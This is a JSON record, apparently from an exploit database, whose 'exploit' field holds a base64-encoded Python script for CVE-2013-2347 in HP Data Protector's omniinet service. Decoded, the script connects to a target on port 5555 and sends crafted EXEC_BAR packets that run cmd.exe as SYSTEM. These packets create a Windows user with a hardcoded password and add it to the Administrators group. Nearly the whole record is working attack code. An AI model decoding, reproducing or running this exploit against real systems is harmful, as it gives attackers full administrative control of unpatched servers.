{
    "source": "exploit-database", 
    "exploit": "aW1wb3J0IGFyZ3BhcnNlDQppbXBvcnQgc29ja2V0DQoNCiIiIg0KRXhwbG9pdCBUaXRsZTogSFAgRGF0YSBQcm90ZWN0b3IgRVhFQ19CQVIgUmVtb3RlIENvbW1hbmQgRXhlY3V0aW9uDQpFeHBsb2l0IEF1dGhvcjogQ2hyaXMgR3JhaGFtIEBjZ3JhaGFtc2V2ZW4NCkNWRTogQ1ZFLTIwMTMtMjM0Nw0KRGF0ZTogRmVicnVhcnkgMTQsIDIwMTQNClZlbmRvciBIb21lcGFnZTogd3d3LmhwLmNvbQ0KVmVyc2lvbjogNi4xMCwgNi4xMSwgNi4yMCANClRlc3RlZCBPbjogV2luZG93cyBTZXJ2ZXIgMjAwMywgV2luZG93cyBTZXJ2ZXIgMjAwOCBSMg0KUmVmZXJlbmNlczogDQpodHRwczovL2gyMDU2Ni53d3cyLmhwLmNvbS9wb3J0YWwvc2l0ZS9ocHNjL3B1YmxpYy9rYi9kb2NEaXNwbGF5Lz9kb2NJZD1lbXJfbmEtYzAzODIyNDIyDQpodHRwOi8vd3d3Lnplcm9kYXlpbml0aWF0aXZlLmNvbS9hZHZpc29yaWVzL1pESS0xNC0wMDgvDQpEZXRhaWxzOg0KDQpUaGUgb21uaWluZXQgc2VydmljZSwgd2hpY2ggcnVucyBieSBkZWZhdWx0IG9uIHBvcnQgNTU1NSwgaXMgc3VzY2VwdGlibGUNCnRvIG51bWVyb3VzIHJlbW90ZWx5IGV4cGxvaXRhYmxlIHZ1bG5lcmFiaWxpdGllcy4gQnkgc2VuZGluZyBhIG1hbGljaW91cw0KRVhFQ19CQVIgcGFja2V0IChvcGNvZGUgMTEpLCBhIHJlbW90ZSBhdHRhY2tlciBjYW4gZm9yY2UgdGhlIG9tbmlpbmV0DQpzZXJ2aWNlIHRvIHJ1biBhbiBhcmJpdHJhcnkgY29tbWFuZC4gT24gV2luZG93cywgdGhlIG9tbmlpbmV0IHNlcnZpY2UgaXMNCnJ1bm5pbmcgYXMgU1lTVEVNLiBUaGlzIGFsbG93cyBmb3IgY29tcGxldGUgY29tcHJvbWlzZSBvZiB0aGUgcmVtb3RlDQpob3N0LiANCg0KVG8gZXhwbG9pdCB0aGlzIHZ1bG5lcmFiaWxpdHksIHlvdSBvbmx5IG5lZWQgdG8gc2VuZCB0d28gc3BlY2lmaWMgYXJndW1lbnRzLiANCk9tbmlpbmV0IGhhcyBhbiBhcmd1bWVudCBwYXJzZXIgdGhhdCB3aWxsIGV4dHJhY3QgdGhlc2Ugb3V0IGFuZCANCmV2ZW50dWFsbHkgcGFzcyB0aGVtIHRvIGEgY2FsbCB0byBDcmVhdGVQcm9jZXNzVyB2aWEgdGhlIGxwQ29tbWFuZExpbmUgDQpwYXJhbWV0ZXIuIA0KDQpXaGVuIGEgcGFja2V0IGlzIHNlbnQgdG8gdGhlIG9tbmlpbmV0IHNlcnZpY2UsIGl0IHdpbGwgY2hlY2sgdGhlIG9wY29kZQ0KYW5kIGxvb2sgdXAgYW4gYXNzb2NpYXRlZCBmdW5jdGlvbiB0byBjYWxsIGJhc2VkIG9uIHRoZSBvcGNvZGUgaW4gYSB0YWJsZQ0Kb2YgZnVuY3Rpb24gcG9pbnRlcnMuIFRoZSBmdW5jdGlvbiB0byBoYW5kbGUgRVhFQ19CQVIgcGFja2V0cyByZXF1aXJlcyB0aGF0DQp0aGUgcGFja2V0IGNvbnRhaW4gYXQgbGVhc3QgMTkgYXJndW1lbnRzLiBUaGUgMTh0aCBhcmd1bWVudCB3aWxsIGJlIHRoZQ0KY29tbWFuZCB3ZSB3YW50IHRvIGV4ZWN1dGUsIGFuZCB0aGUgMTl0aCB3aWxsIGJlIGFuIGFyZ3VtZW50IHdlIGNhbiBwYXNzIHRvIA0KdGhlIGNvbW1hbmQgd2UgYXJlIGV4ZWN1dGluZy4gVGhpcyBleHBsb2l0IHdpbGwgY3JlYXRlIGEgbmV3IHdpbmRvd3MgYWNjb3VudCANCmFuZCBhZGQgaXQgdG8gdGhlIGxvY2FsIEFkbWluaXN0cmF0b3JzIGdyb3VwLiBUaGlzIG1lYW5zIHRoYXQgbHBDb21tYW5kTGluZSANCnRoYXQgZ2V0cyBwYXNzZWQgdG8gQ3JlYXRlUHJvY2VzcyB3aWxsIG5lZWQgdG8gbG9vayBsaWtlOg0KDQonYzpcd2luZG93c1xzeXN0ZW0zMlxjbWQuZXhlJyAnL2MgbmV0IHVzZXIgdXNyIHBAc3MhMjMgL2FkZCcNCmFuZA0KJ2M6XHdpbmRvd3Ncc3lzdGVtMzJcY21kLmV4ZScgJy9jIG5ldCBsb2NhbGdyb3VwIEFkbWluaXN0cmF0b3JzIHVzciAvYWRkJw0KDQpOb3RlOiBUaGUgMTl0aCB2YWx1ZSBoYXMgc2l6ZSBjb25zdHJhaW50cyBzbyBpdCBuZWVkcyB0byBiZSBhcyBzaG9ydCBvZiBhIA0Kc3RyaW5nIGFzIHBvc3NpYmxlLiANCiIiIg0KDQpleGVjX2Jhcl9hZGRfdXNlciA9IFwNCiJceDAwXHgwMFx4MDFceDNjXHhmZlx4ZmVceDMyXHgwMFx4MDBceDAwXHgyMFx4MDBceDY4XHgwMFx4NzBceDAwIiArIFwNCiJceDY0XHgwMFx4NzBceDAwXHgzMVx4MDBceDAwXHgwMFx4MjBceDAwXHgzMFx4MDBceDAwXHgwMFx4MjBceDAwIiArIFwNCiJceDAwXHgwMFx4MjBceDAwXHgwMFx4MDBceDIwXHgwMFx4NDVceDAwXHg0ZVx4MDBceDU1XHgwMFx4MDBceDAwIiArIFwNCiJceDIwXHgwMFx4MzFceDAwXHgzMVx4MDBceDAwXHgwMFx4MjBceDAwXHg0NVx4MDBceDU4XHgwMFx4NDVceDAwIiArIFwNCiJceDQzXHgwMFx4NWZceDAwXHg0Mlx4MDBceDQxXHgwMFx4NTJceDAwXHgwMFx4MDBceDIwXHgwMFx4NDFceDAwIiArIFwNCiJceDQxXHgwMFx4NDFceDAwXHg0MVx4MDBceDAwXHgwMFx4MjBceDAwXHg0MVx4MDBceDQxXHgwMFx4NDFceDAwIiArIFwNCiJceDQxXHgwMFx4MDBceDAwXHgyMFx4MDBceDQxXHgwMFx4NDFceDAwXHg0MVx4MDBceDQxXHgwMFx4MDBceDAwIiArIFwNCiJceDIwXHgwMFx4NDFceDAwXHg0MVx4MDBceDQxXHgwMFx4NDFceDAwXHgwMFx4MDBceDIwXHgwMFx4NDFceDAwIiArIFwNCiJceDQxXHgwMFx4NDFceDAwXHg0MVx4MDBceDAwXHgwMFx4MjBceDAwXHg0MVx4MDBceDQxXHgwMFx4NDFceDAwIiArIFwNCiJceDQxXHgwMFx4MDBceDAwXHgyMFx4MDBceDQxXHgwMFx4NDFceDAwXHg0MVx4MDBceDQxXHgwMFx4MDBceDAwIiArIFwNCiJceDIwXHgwMFx4NDFceDAwXHg0MVx4MDBceDQxXHgwMFx4NDFceDAwXHgwMFx4MDBceDIwXHgwMFx4NDFceDAwIiArIFwNCiJceDQxXHgwMFx4NDFceDAwXHg0MVx4MDBceDAwXHgwMFx4MjBceDAwXHg0MVx4MDBceDQxXHgwMFx4NDFceDAwIiArIFwNCiJceDQxXHgwMFx4MDBceDAwXHgyMFx4MDBceDYzXHgwMFx4M2FceDAwXHg1Y1x4MDBceDc3XHgwMFx4NjlceDAwIiArIFwNCiJceDZlXHgwMFx4NjRceDAwXHg2Zlx4MDBceDc3XHgwMFx4NzNceDAwXHg1Y1x4MDBceDczXHgwMFx4NzlceDAwIiArIFwNCiJceDczXHgwMFx4NzRceDAwXHg2NVx4MDBceDZkXHgwMFx4MzNceDAwXHgzMlx4MDBceDVjXHgwMFx4NjNceDAwIiArIFwNCiJceDZkXHgwMFx4NjRceDAwXHgyZVx4MDBceDY1XHgwMFx4NzhceDAwXHg2NVx4MDBceDAwXHgwMFx4MjBceDAwIiArIFwNCiJceDAwXHgwMFx4MjBceDAwXHgyZlx4MDBceDYzXHgwMFx4MjBceDAwXHg2ZVx4MDBceDY1XHgwMFx4NzRceDAwIiArIFwNCiJceDIwXHgwMFx4NzVceDAwXHg3M1x4MDBceDY1XHgwMFx4NzJceDAwXHgyMFx4MDBceDc1XHgwMFx4NzNceDAwIiArIFwNCiJceDcyXHgwMFx4MjBceDAwXHg3MFx4MDBceDQwXHgwMFx4NzNceDAwXHg3M1x4MDBceDIxXHgwMFx4MzJceDAwIiArIFwNCiJceDMzXHgwMFx4MjBceDAwXHgyZlx4MDBceDYxXHgwMFx4NjRceDAwXHg2NFx4MDBceDAwXHgwMFx4MDBceDAwIg0KDQpleGVjX2Jhcl9tYWtlX2FkbWluID0gXA0KIlx4MDBceDAwXHgwMVx4NTZceGZmXHhmZVx4MzJceDAwXHgwMFx4MDBceDIwXHgwMFx4NjhceDAwXHg3MFx4MDAiICsgXA0KIlx4NjRceDAwXHg3MFx4MDBceDMxXHgwMFx4MDBceDAwXHgyMFx4MDBceDMwXHgwMFx4MDBceDAwXHgyMFx4MDAiICsgXA0KIlx4MDBceDAwXHgyMFx4MDBceDAwXHgwMFx4MjBceDAwXHg0NVx4MDBceDRlXHgwMFx4NTVceDAwXHgwMFx4MDAiICsgXA0KIlx4MjBceDAwXHgzMVx4MDBceDMxXHgwMFx4MDBceDAwXHgyMFx4MDBceDQ1XHgwMFx4NThceDAwXHg0NVx4MDAiICsgXA0KIlx4NDNceDAwXHg1Zlx4MDBceDQyXHgwMFx4NDFceDAwXHg1Mlx4MDBceDAwXHgwMFx4MjBceDAwXHg0MVx4MDAiICsgXA0KIlx4NDFceDAwXHg0MVx4MDBceDQxXHgwMFx4MDBceDAwXHgyMFx4MDBceDQxXHgwMFx4NDFceDAwXHg0MVx4MDAiICsgXA0KIlx4NDFceDAwXHgwMFx4MDBceDIwXHgwMFx4NDFceDAwXHg0MVx4MDBceDQxXHgwMFx4NDFceDAwXHgwMFx4MDAiICsgXA0KIlx4MjBceDAwXHg0MVx4MDBceDQxXHgwMFx4NDFceDAwXHg0MVx4MDBceDAwXHgwMFx4MjBceDAwXHg0MVx4MDAiICsgXA0KIlx4NDFceDAwXHg0MVx4MDBceDQxXHgwMFx4MDBceDAwXHgyMFx4MDBceDQxXHgwMFx4NDFceDAwXHg0MVx4MDAiICsgXA0KIlx4NDFceDAwXHgwMFx4MDBceDIwXHgwMFx4NDFceDAwXHg0MVx4MDBceDQxXHgwMFx4NDFceDAwXHgwMFx4MDAiICsgXA0KIlx4MjBceDAwXHg0MVx4MDBceDQxXHgwMFx4NDFceDAwXHg0MVx4MDBceDAwXHgwMFx4MjBceDAwXHg0MVx4MDAiICsgXA0KIlx4NDFceDAwXHg0MVx4MDBceDQxXHgwMFx4MDBceDAwXHgyMFx4MDBceDQxXHgwMFx4NDFceDAwXHg0MVx4MDAiICsgXA0KIlx4NDFceDAwXHgwMFx4MDBceDIwXHgwMFx4NjNceDAwXHgzYVx4MDBceDVjXHgwMFx4NzdceDAwXHg2OVx4MDAiICsgXA0KIlx4NmVceDAwXHg2NFx4MDBceDZmXHgwMFx4NzdceDAwXHg3M1x4MDBceDVjXHgwMFx4NzNceDAwXHg3OVx4MDAiICsgXA0KIlx4NzNceDAwXHg3NFx4MDBceDY1XHgwMFx4NmRceDAwXHgzM1x4MDBceDMyXHgwMFx4NWNceDAwXHg2M1x4MDAiICsgXA0KIlx4NmRceDAwXHg2NFx4MDBceDJlXHgwMFx4NjVceDAwXHg3OFx4MDBceDY1XHgwMFx4MDBceDAwXHgyMFx4MDAiICsgXA0KIlx4MDBceDAwXHgyMFx4MDBceDJmXHgwMFx4NjNceDAwXHgyMFx4MDBceDZlXHgwMFx4NjVceDAwXHg3NFx4MDAiICsgXA0KIlx4MjBceDAwXHg2Y1x4MDBceDZmXHgwMFx4NjNceDAwXHg2MVx4MDBceDZjXHgwMFx4NjdceDAwXHg3Mlx4MDAiICsgXA0KIlx4NmZceDAwXHg3NVx4MDBceDcwXHgwMFx4MjBceDAwXHg0MVx4MDBceDY0XHgwMFx4NmRceDAwXHg2OVx4MDAiICsgXA0KIlx4NmVceDAwXHg2OVx4MDBceDczXHgwMFx4NzRceDAwXHg3Mlx4MDBceDYxXHgwMFx4NzRceDAwXHg2Zlx4MDAiICsgXA0KIlx4NzJceDAwXHg3M1x4MDBceDIwXHgwMFx4NzVceDAwXHg3M1x4MDBceDcyXHgwMFx4MjBceDAwXHgyZlx4MDAiICsgXA0KIlx4NjFceDAwXHg2NFx4MDBceDY0XHgwMFx4MDBceDAwXHgwMFx4MDAiDQoNCmRlZiBjb25uZWN0X3RhcmdldCh0YXJnZXQsIHBvcnQpOg0KICAgIHRyeToNCiAgICAgICAgc29jayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCiAgICBleGNlcHQgc29ja2V0LmVycm9yIGFzIGVycjoNCiAgICAgICAgcHJpbnQgIlstXUVSUk9SIENSRUFUSU5HIFNPQ0tFVCEgQ09ERTogJWQgTVNHOiAlcyIgJSAoZXJyWzBdLCBlcnJbMV0pIA0KICAgICAgICByZXR1cm4gLTENCiAgICB0cnk6DQogICAgICAgIHNvY2suY29ubmVjdCgodGFyZ2V0LCBwb3J0KSkNCiAgICBleGNlcHQgc29ja2V0LmVycm9yIGFzIGVycjoNCiAgICAgICAgcHJpbnQgIlstXUVSUk9SIENPTk5FQ1RJTkcgVE8gVEFSR0VUISBDT0RFOiAlZCBNU0c6ICVzIiAlIChlcnJbMF0sIGVyclsxXSkNCiAgICAgICAgcmV0dXJuIC0xDQogICAgcmV0dXJuIHNvY2sNCg0KZGVmIHNlbmRfcmVjdl9wYWNrZXQoc29jaywgcGFja2V0KToNCiAgICBzb2NrLnNlbmRhbGwocGFja2V0KQ0KICAgIHJlcyA9IHNvY2sucmVjdig0MDk2KQ0KICAgIHJldHVybiByZXMNCg0KY21kbGluZV9wYXJzZXIgPSBhcmdwYXJzZS5Bcmd1bWVudFBhcnNlcihkZXNjcmlwdGlvbj0nSFAgRGF0YSBQcm90ZWN0b3IgRVhFQ19CQVIgUmVtb3RlIENvbW1hbmQgRXhlY3V0aW9uJykNCmNtZGxpbmVfcGFyc2VyLmFkZF9hcmd1bWVudCgnLXQnLCBkZXN0PSdpcCcsIGhlbHA9J1RhcmdldCBob3N0IGlwJywgcmVxdWlyZWQ9VHJ1ZSkNCmNtZGxpbmVfcGFyc2VyLmFkZF9hcmd1bWVudCgnLXAnLCBkZXN0PSdwb3J0JywgaGVscD0nVGFyZ2V0IHBvcnQnLCBkZWZhdWx0PTU1NTUsIHR5cGU9aW50LCByZXF1aXJlZD1GYWxzZSkNCmFyZ3MgPSBjbWRsaW5lX3BhcnNlci5wYXJzZV9hcmdzKCkNCg0KcHJpbnQgIlxuWypdQVRURU1QSU5HIFRPIEFERCBXSU5ET1dTIEFETUlOSVNUUkFUT1IgQUNDT1VOVCB1c3IgV0lUSCBQQVNTV09SRCBwQHNzITIzIg0KZm9yIHBhY2tldCBpbiBbZXhlY19iYXJfYWRkX3VzZXIsIGV4ZWNfYmFyX21ha2VfYWRtaW5dOg0KICAgIHRhcmdldCA9IGNvbm5lY3RfdGFyZ2V0KGFyZ3MuaXAsIGFyZ3MucG9ydCkNCiAgICBpZiB0YXJnZXQgPT0gLTE6IGV4aXQoKQ0KICAgIGRhdGEgPSBzZW5kX3JlY3ZfcGFja2V0KHRhcmdldCwgcGFja2V0KQ0KICAgIHByaW50ICJbKl1TRVJWRVIgUkVTUE9OU0U6ICIgKyBcDQogICAgZGF0YS5zcGxpdCgiXHhGRlx4RkVceDMxXHgwMFx4MzVceDAwXHgwMFx4MDBceDIwXHgwMCIpWzFdLmxzdHJpcCgiXHgwN1x4MDBceDAxXHgwMCIpLnJzdHJpcCgiJCIpDQogICAgdGFyZ2V0LmNsb3NlKCk=", 
    "filename": "platforms/windows/remote/31689.py", 
    "id": "31689", 
    "cves": [
        "CVE-2013-2347"
    ]
}